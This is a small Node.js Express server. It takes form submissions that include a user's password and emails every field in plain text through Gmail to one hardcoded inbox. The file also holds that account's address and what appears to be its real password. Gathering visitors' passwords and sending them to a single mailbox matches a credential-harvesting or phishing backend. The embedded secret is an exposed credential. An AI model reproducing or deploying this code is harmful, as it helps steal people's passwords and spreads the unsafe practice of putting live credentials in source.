const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json());

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'lyavalakevin@gmail.com', // Replace with your email
        pass: 'Superarnold4545'  // Replace with your email password
    }
});

app.post('/send-email', (req, res) => {
    const { name, email, password, age } = req.body;

    const mailOptions = {
        from: 'lyavalakevin@gmail.com',
        to: 'lyavalakevin@gmail.com',
        subject: 'Form Submission',
        text: `Name: ${name}\nEmail: ${email}\nPassword: ${password}\nAge: ${age}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error(error);
            return res.status(500).send('Error sending email.');
        }
        res.status(200).send('Email sent successfully.');
    });
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
